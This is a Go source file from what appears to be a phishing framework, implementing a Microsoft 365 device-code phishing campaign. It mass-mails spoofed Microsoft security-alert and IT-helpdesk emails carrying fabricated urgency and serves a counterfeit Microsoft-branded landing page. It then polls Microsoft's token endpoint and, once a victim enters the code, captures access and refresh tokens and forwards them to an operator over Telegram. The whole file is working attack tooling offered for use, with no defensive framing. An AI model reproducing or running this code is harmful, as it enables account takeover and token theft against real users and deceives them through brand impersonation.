package core

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/smtp"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/x-tymus/x-tymus/log"
)

// Microsoft Office public client — no app registration required.
const (
	dcClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	dcScope    = "https://graph.microsoft.com/.default offline_access openid profile email"
)

// ─────────────────────────────────────────────────────────────────────────────
// Data structures
// ─────────────────────────────────────────────────────────────────────────────

// DCTarget is one victim in a campaign.
type DCTarget struct {
	ID              int
	CampaignID      int
	Email           string
	Tenant          string
	LandingToken    string // random hex — URL: /dc/<token>
	UserCode        string // code victim enters at microsoft.com/devicelogin
	VerificationURI string
	ExpiresIn       int
	StartedAt       time.Time
	Status          string // pending | completed | declined | expired | error
	AccessToken     string
	RefreshToken    string
	IDToken         string
	mu              sync.Mutex
	deviceCode      string
	interval        int
}

// DCCampaign groups multiple targets sent in one bulk run.
type DCCampaign struct {
	ID        int
	Name      string
	Template  string // "security_alert" | "it_helpdesk" | "custom"
	CreatedAt time.Time
	Targets   []*DCTarget
}

var (
	dcMu        sync.Mutex
	dcCampaigns []*DCCampaign
	dcTargets   []*DCTarget // flat list for easy lookup by LandingToken
	dcNextCamp  = 1
	dcNextTgt   = 1
)

// GlobalDCCfg is set from main so the device code sender can reach SMTP config.
var GlobalDCCfg *Config

// ─────────────────────────────────────────────────────────────────────────────
// Public API
// ─────────────────────────────────────────────────────────────────────────────

// StartDeviceCode starts a single device code flow (terminal `dc start` command).
func StartDeviceCode(tenantOrEmail string) (*DCTarget, error) {
	tgt, err := newTarget(0, tenantOrEmail)
	if err != nil {
		return nil, err
	}
	dcMu.Lock()
	dcTargets = append(dcTargets, tgt)
	dcMu.Unlock()
	go tgt.poll()
	return tgt, nil
}

// LaunchCampaign starts a device code flow for every email in the list,
// sends each a phishing email via SMTP, and returns the campaign.
func LaunchCampaign(name, template string, emails []string) (*DCCampaign, error) {
	camp := &DCCampaign{
		Name:      name,
		Template:  template,
		CreatedAt: time.Now(),
	}

	dcMu.Lock()
	camp.ID = dcNextCamp
	dcNextCamp++
	dcCampaigns = append(dcCampaigns, camp)
	dcMu.Unlock()

	var errs []string
	for _, email := range emails {
		email = strings.TrimSpace(email)
		if email == "" || !strings.Contains(email, "@") {
			continue
		}
		tgt, err := newTarget(camp.ID, email)
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", email, err))
			continue
		}
		dcMu.Lock()
		camp.Targets = append(camp.Targets, tgt)
		dcTargets = append(dcTargets, tgt)
		dcMu.Unlock()

		go tgt.poll()
		// Send phishing email (non-fatal if SMTP not configured)
		go func(t *DCTarget) {
			if err := sendDCEmail(t, template); err != nil {
				log.Error("dc campaign [%d] email to %s: %v", camp.ID, t.Email, err)
			}
		}(tgt)
	}

	if len(errs) > 0 {
		log.Warning("dc campaign [%d]: %d errors: %s", camp.ID, len(errs), strings.Join(errs, "; "))
	}
	return camp, nil
}

// GetCampaigns returns all campaigns.
func GetCampaigns() []*DCCampaign {
	dcMu.Lock()
	defer dcMu.Unlock()
	out := make([]*DCCampaign, len(dcCampaigns))
	copy(out, dcCampaigns)
	return out
}

// GetDCTargets returns all targets (across all campaigns + standalone).
func GetDCTargets() []*DCTarget {
	dcMu.Lock()
	defer dcMu.Unlock()
	out := make([]*DCTarget, len(dcTargets))
	copy(out, dcTargets)
	return out
}

// GetTargetByToken returns the DCTarget for a landing page token.
func GetTargetByToken(token string) *DCTarget {
	dcMu.Lock()
	defer dcMu.Unlock()
	for _, t := range dcTargets {
		if t.LandingToken == token {
			return t
		}
	}
	return nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Internal helpers
// ─────────────────────────────────────────────────────────────────────────────

func newTarget(campaignID int, emailOrTenant string) (*DCTarget, error) {
	tenant := "common"
	email := ""
	if strings.Contains(emailOrTenant, "@") {
		email = emailOrTenant
		parts := strings.SplitN(emailOrTenant, "@", 2)
		tenant = parts[1]
	} else if emailOrTenant != "" {
		tenant = emailOrTenant
	}

	apiURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode", tenant)
	form := url.Values{}
	form.Set("client_id", dcClientID)
	form.Set("scope", dcScope)

	resp, err := http.PostForm(apiURL, form)
	if err != nil {
		return nil, fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var dc struct {
		DeviceCode      string `json:"device_code"`
		UserCode        string `json:"user_code"`
		VerificationURI string `json:"verification_uri"`
		ExpiresIn       int    `json:"expires_in"`
		Interval        int    `json:"interval"`
		Error           string `json:"error"`
		ErrorDesc       string `json:"error_description"`
	}
	if err := json.Unmarshal(body, &dc); err != nil {
		return nil, fmt.Errorf("bad response: %v", err)
	}
	if dc.Error != "" {
		return nil, fmt.Errorf("%s — %s", dc.Error, dc.ErrorDesc)
	}

	interval := dc.Interval
	if interval < 5 {
		interval = 5
	}

	token := randHex(16)

	dcMu.Lock()
	tgt := &DCTarget{
		ID:              dcNextTgt,
		CampaignID:      campaignID,
		Email:           email,
		Tenant:          tenant,
		LandingToken:    token,
		deviceCode:      dc.DeviceCode,
		UserCode:        dc.UserCode,
		VerificationURI: dc.VerificationURI,
		ExpiresIn:       dc.ExpiresIn,
		StartedAt:       time.Now(),
		Status:          "pending",
		interval:        interval,
	}
	dcNextTgt++
	dcMu.Unlock()
	return tgt, nil
}

func (s *DCTarget) poll() {
	apiURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", s.Tenant)
	deadline := s.StartedAt.Add(time.Duration(s.ExpiresIn) * time.Second)
	interval := s.interval

	for time.Now().Before(deadline) {
		time.Sleep(time.Duration(interval) * time.Second)

		form := url.Values{}
		form.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
		form.Set("device_code", s.deviceCode)
		form.Set("client_id", dcClientID)

		resp, err := http.PostForm(apiURL, form)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		var tok struct {
			AccessToken  string `json:"access_token"`
			RefreshToken string `json:"refresh_token"`
			IDToken      string `json:"id_token"`
			Error        string `json:"error"`
		}
		if err := json.Unmarshal(body, &tok); err != nil {
			continue
		}

		switch tok.Error {
		case "authorization_pending":
			// keep waiting
		case "slow_down":
			interval += 5
		case "authorization_declined":
			s.setStatus("declined")
			log.Warning("dc [#%d] %s: declined", s.ID, s.Email)
			return
		case "expired_token":
			s.setStatus("expired")
			log.Warning("dc [#%d] %s: expired", s.ID, s.Email)
			return
		case "":
			s.mu.Lock()
			s.Status = "completed"
			s.AccessToken = tok.AccessToken
			s.RefreshToken = tok.RefreshToken
			s.IDToken = tok.IDToken
			s.mu.Unlock()
			log.Success("dc [#%d] %s: TOKENS CAPTURED", s.ID, s.Email)
			log.Info("  access_token : %s...", trunc(tok.AccessToken, 60))
			log.Info("  refresh_token: %s...", trunc(tok.RefreshToken, 60))
			dcNotify(s)
			return
		default:
			s.setStatus("error")
			log.Error("dc [#%d] %s: %s", s.ID, s.Email, tok.Error)
			return
		}
	}
	s.setStatus("expired")
	log.Warning("dc [#%d] %s: expired (no auth)", s.ID, s.Email)
}

func (s *DCTarget) setStatus(st string) {
	s.mu.Lock()
	s.Status = st
	s.mu.Unlock()
}

func (s *DCTarget) GetStatus() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.Status
}

// ─────────────────────────────────────────────────────────────────────────────
// Telegram notification
// ─────────────────────────────────────────────────────────────────────────────

func dcNotify(s *DCTarget) {
	if GlobalBot == nil {
		return
	}
	adminID := GlobalBot.cfg.GetBotAdminChatId()
	if adminID == 0 {
		return
	}
	target := s.Email
	if target == "" {
		target = s.Tenant
	}
	msg := fmt.Sprintf(
		"🎯 *Device Code — Tokens Captured\\!*\n\n"+
			"📧 Target: `%s`\n"+
			"👤 Code: `%s`\n\n"+
			"🔑 *Access Token:*\n`%s`\n\n"+
			"♻️ *Refresh Token:*\n`%s`",
		tgEscape(target),
		tgEscape(s.UserCode),
		trunc(s.AccessToken, 200),
		trunc(s.RefreshToken, 200),
	)
	GlobalBot.send(adminID, msg)
}

// ─────────────────────────────────────────────────────────────────────────────
// SMTP email sender
// ─────────────────────────────────────────────────────────────────────────────

func sendDCEmail(t *DCTarget, template string) error {
	if GlobalDCCfg == nil {
		return fmt.Errorf("no config")
	}
	host := GlobalDCCfg.GetSmtpHost()
	port := GlobalDCCfg.GetSmtpPort()
	user := GlobalDCCfg.GetSmtpUser()
	pass := GlobalDCCfg.GetSmtpPass()
	from := GlobalDCCfg.GetSmtpFrom()

	if host == "" || t.Email == "" {
		return fmt.Errorf("smtp not configured or no email target")
	}
	if port == 0 {
		port = 587
	}
	if from == "" {
		from = user
	}

	// SMTP MAIL FROM envelope needs bare email only, not "Name <email>" format.
	// The From: header in the message body keeps the display name.
	envelopeFrom := extractEmail(from)

	subject, body := buildEmailContent(t, template)

	// Build raw MIME message (From: header keeps display name if set)
	msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: %s\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n%s",
		from, t.Email, subject, body)

	addr := fmt.Sprintf("%s:%d", host, port)

	// Microsoft (Outlook / Office365) requires AUTH LOGIN, not AUTH PLAIN.
	// All other hosts get PLAIN first; if that fails we retry with LOGIN.
	var auth smtp.Auth
	if strings.Contains(host, "outlook") || strings.Contains(host, "office365") || strings.Contains(host, "hotmail") {
		auth = newLoginAuth(user, pass)
	} else {
		auth = smtp.PlainAuth("", user, pass, host)
	}

	// Port 465 = implicit TLS (SSL), port 587 = STARTTLS
	if port == 465 {
		tlsCfg := &tls.Config{ServerName: host}
		conn, err := tls.Dial("tcp", addr, tlsCfg)
		if err != nil {
			return err
		}
		c, err := smtp.NewClient(conn, host)
		if err != nil {
			return err
		}
		defer c.Close()
		if err = c.Auth(auth); err != nil {
			// retry with LOGIN auth
			auth = newLoginAuth(user, pass)
			if err2 := c.Auth(auth); err2 != nil {
				return err
			}
		}
		if err = c.Mail(envelopeFrom); err != nil {
			return err
		}
		if err = c.Rcpt(t.Email); err != nil {
			return err
		}
		w, err := c.Data()
		if err != nil {
			return err
		}
		_, err = w.Write([]byte(msg))
		w.Close()
		return err
	}
	// STARTTLS (port 587 default)
	if err := smtp.SendMail(addr, auth, envelopeFrom, []string{t.Email}, []byte(msg)); err != nil {
		// retry with LOGIN auth if PLAIN was rejected
		auth = newLoginAuth(user, pass)
		return smtp.SendMail(addr, auth, envelopeFrom, []string{t.Email}, []byte(msg))
	}
	return nil
}

// extractEmail pulls the bare email address from "Display Name <email>" or returns as-is.
func extractEmail(from string) string {
	if i := strings.Index(from, "<"); i != -1 {
		if j := strings.Index(from[i:], ">"); j != -1 {
			return strings.TrimSpace(from[i+1 : i+j])
		}
	}
	return strings.TrimSpace(from)
}

func buildEmailContent(t *DCTarget, template string) (subject, body string) {
	verifyLink := t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)

	// Landing page URL (if server is running)
	landingURL := ""
	if GlobalDCCfg != nil && GlobalDCCfg.GetBaseDomain() != "" {
		landingURL = "https://" + GlobalDCCfg.GetBaseDomain() + "/dc/" + t.LandingToken
	}
	if landingURL == "" {
		landingURL = verifyLink
	}

	switch template {
	case "it_helpdesk":
		subject = "Action Required: Verify Your Identity"
		body = fmt.Sprintf(`<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
<div style="max-width:600px;margin:auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.1)">
<div style="background:#0078d4;padding:24px;text-align:center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" height="30" alt="Microsoft">
</div>
<div style="padding:32px">
  <h2 style="color:#1f1f1f;margin-top:0">Your IT team requires identity verification</h2>
  <p style="color:#444">We noticed unusual activity on your account and need to verify your identity before you can continue.</p>
  <p style="color:#444">Please complete the verification within <strong>15 minutes</strong>:</p>
  <div style="text-align:center;margin:28px 0">
    <div style="font-size:32px;font-weight:bold;letter-spacing:8px;color:#0078d4;background:#f0f7ff;border:2px dashed #0078d4;padding:16px 32px;display:inline-block;border-radius:6px">%s</div>
  </div>
  <div style="text-align:center;margin-bottom:24px">
    <a href="%s" style="background:#0078d4;color:#fff;padding:12px 28px;border-radius:4px;text-decoration:none;font-size:15px;display:inline-block">Verify Now →</a>
  </div>
  <p style="color:#777;font-size:12px">Or go to <a href="%s">%s</a> and enter the code above.</p>
  <hr style="border:none;border-top:1px solid #eee;margin:24px 0">
  <p style="color:#aaa;font-size:11px">If you did not request this, contact IT support immediately.</p>
</div></div></body></html>`, t.UserCode, landingURL, verifyLink, verifyLink)

	case "security_alert":
		fallthrough
	default:
		subject = "Microsoft Security Alert: Sign-in Verification Required"
		body = fmt.Sprintf(`<!DOCTYPE html><html><body style="font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;padding:20px;margin:0">
<div style="max-width:600px;margin:auto;background:#fff;border-radius:4px;overflow:hidden">
<div style="background:#0078d4;padding:20px 28px;display:flex;align-items:center;gap:12px">
  <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" height="24" alt="">
  <span style="color:#fff;font-size:14px;letter-spacing:.5px">Microsoft Account</span>
</div>
<div style="padding:36px 28px">
  <p style="color:#666;font-size:13px;margin-top:0">SECURITY NOTICE</p>
  <h1 style="font-size:22px;color:#1f1f1f;margin:0 0 16px;font-weight:600">Verify your sign-in</h1>
  <p style="color:#444;line-height:1.6">We detected a sign-in attempt to your account from a new device. To confirm it's you, please complete verification using the code below.</p>
  <div style="background:#f8f8f8;border-left:4px solid #0078d4;padding:16px 20px;margin:24px 0;border-radius:0 4px 4px 0">
    <p style="margin:0 0 4px;color:#666;font-size:12px;text-transform:uppercase;letter-spacing:.5px">Your verification code</p>
    <p style="margin:0;font-size:30px;font-weight:700;letter-spacing:6px;color:#0078d4">%s</p>
  </div>
  <p style="color:#555;font-size:13px">Enter this code at:</p>
  <p style="margin:4px 0 24px"><a href="%s" style="color:#0078d4;font-size:14px">%s</a></p>
  <div style="text-align:center;margin:20px 0">
    <a href="%s" style="background:#0078d4;color:#fff;padding:11px 32px;border-radius:2px;text-decoration:none;font-size:14px;font-weight:600">Complete Verification</a>
  </div>
  <hr style="border:none;border-top:1px solid #edebe9;margin:28px 0">
  <p style="color:#aaa;font-size:11px;line-height:1.5">This message was sent to %s. If you didn't initiate this, you can safely ignore this email.</p>
</div>
<div style="background:#f3f2f1;padding:12px 28px;text-align:center">
  <p style="color:#aaa;font-size:11px;margin:0">© Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p>
</div>
</div></body></html>`, t.UserCode, verifyLink, verifyLink, landingURL, t.Email)
	}
	return
}

// ─────────────────────────────────────────────────────────────────────────────
// Landing page HTML — served at /dc/{token}
// Shows the code + a "Verify Now" button pointing to microsoft.com/devicelogin
// ─────────────────────────────────────────────────────────────────────────────

func DCLandingPage(t *DCTarget) string {
	verifyURL := t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Microsoft – Verify your identity</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;min-height:100vh;display:flex;flex-direction:column}
.header{background:#0078d4;padding:14px 24px;display:flex;align-items:center;gap:12px}
.header svg{width:108px;height:24px}
.header span{color:rgba(255,255,255,.7);font-size:13px;border-left:1px solid rgba(255,255,255,.3);padding-left:12px;margin-left:4px}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:32px 16px}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.15);padding:40px 44px;max-width:420px;width:100%%;text-align:center}
.logo-wrap{margin-bottom:24px}
.logo-wrap svg{width:44px;height:44px}
h1{font-size:20px;font-weight:600;color:#1b1b1b;margin-bottom:10px}
.sub{color:#605e5c;font-size:14px;line-height:1.5;margin-bottom:28px}
.code-box{background:#f0f6ff;border:2px dashed #0078d4;border-radius:6px;padding:18px;margin-bottom:28px}
.code-label{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#605e5c;margin-bottom:6px}
.code{font-size:38px;font-weight:700;letter-spacing:10px;color:#0078d4;font-family:'Courier New',monospace}
.btn{display:block;width:100%%;background:#0078d4;color:#fff;padding:12px;border-radius:2px;font-size:15px;font-weight:600;text-decoration:none;margin-bottom:12px;transition:background .15s}
.btn:hover{background:#106ebe}
.hint{font-size:12px;color:#a19f9d;line-height:1.5}
.hint a{color:#0078d4}
.footer{text-align:center;padding:16px;font-size:11px;color:#a19f9d}
</style>
</head>
<body>
<div class="header">
<svg viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M0 0h11.4v11.4H0V0zm12.6 0H24v11.4H12.6V0zM0 12.6h11.4V24H0V12.6zm12.6 0H24V24H12.6V12.6z" fill="#fff"/>
  <path d="M35.5 18V6.2h2.2l3.6 8.1 3.5-8.1h2.2V18h-1.8v-9.2L41.4 18h-1.2l-3.8-9.2V18h-1.9zm14.4 0V6.2h1.9V18h-1.9zm4.5 0V6.2h2l5.2 9V6.2h1.8V18h-2l-5.2-9V18H54.4zm12.4 0V6.2h7.2v1.6h-5.3v3.4h5v1.6h-5v3.6h5.5V18h-7.4zm10.2 0V6.2h3.9c1.2 0 2.2.3 2.9 1s1.1 1.5 1.1 2.6c0 .8-.2 1.5-.6 2-.4.6-.9 1-1.6 1.2L85.1 18h-2l-2.4-4.5h-1.8V18h-1.9zm1.9-6h1.9c.7 0 1.2-.2 1.6-.5.4-.4.6-.9.6-1.5s-.2-1.1-.6-1.5c-.4-.4-.9-.5-1.6-.5h-1.9v4zm9.3 6V7.8H84v-1.6h7.4v1.6h-2.7V18h-1.9z" fill="white"/>
</svg>
<span>Account Security</span>
</div>
<div class="main">
<div class="card">
  <div class="logo-wrap">
    <svg viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg">
      <rect x="0" y="0" width="21" height="21" fill="#f25022"/>
      <rect x="23" y="0" width="21" height="21" fill="#7fba00"/>
      <rect x="0" y="23" width="21" height="21" fill="#00a4ef"/>
      <rect x="23" y="23" width="21" height="21" fill="#ffb900"/>
    </svg>
  </div>
  <h1>Verify it's you</h1>
  <p class="sub">To confirm your identity, enter the code below at the Microsoft verification page.</p>
  <div class="code-box">
    <div class="code-label">Your code</div>
    <div class="code" id="uc">%s</div>
  </div>
  <a class="btn" href="%s" target="_blank">Open Verification Page →</a>
  <p class="hint">
    Or go to <a href="%s" target="_blank">microsoft.com/devicelogin</a>
    and enter the code manually.<br><br>
    This code expires in %d minutes.
  </p>
</div>
</div>
<div class="footer">© Microsoft Corporation · Privacy · Terms</div>
<script>
// Copy code to clipboard on click
document.getElementById('uc').style.cursor='pointer';
document.getElementById('uc').title='Click to copy';
document.getElementById('uc').addEventListener('click',function(){
  navigator.clipboard&&navigator.clipboard.writeText(this.innerText);
  this.style.color='#107c10';
  setTimeout(()=>{this.style.color='';},1200);
});
</script>
</body>
</html>`, t.UserCode, verifyURL, t.VerificationURI, t.ExpiresIn/60)
}

// ─────────────────────────────────────────────────────────────────────────────
// Utilities
// ─────────────────────────────────────────────────────────────────────────────

func randHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func trunc(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// ─────────────────────────────────────────────────────────────────────────────
// AUTH LOGIN implementation (required by Microsoft / Outlook SMTP)
// Go's smtp.PlainAuth sends AUTH PLAIN which Microsoft rejects with 504 5.7.4
// ─────────────────────────────────────────────────────────────────────────────

type loginAuth struct{ user, pass string }

func newLoginAuth(user, pass string) smtp.Auth { return &loginAuth{user, pass} }

func (a *loginAuth) Start(_ *smtp.ServerInfo) (string, []byte, error) {
	return "LOGIN", nil, nil
}

func (a *loginAuth) Next(fromServer []byte, more bool) ([]byte, error) {
	if !more {
		return nil, nil
	}
	switch strings.ToLower(strings.TrimSpace(string(fromServer))) {
	case "username:":
		return []byte(a.user), nil
	case "password:":
		return []byte(a.pass), nil
	default:
		return nil, fmt.Errorf("unexpected server prompt: %s", fromServer)
	}
}
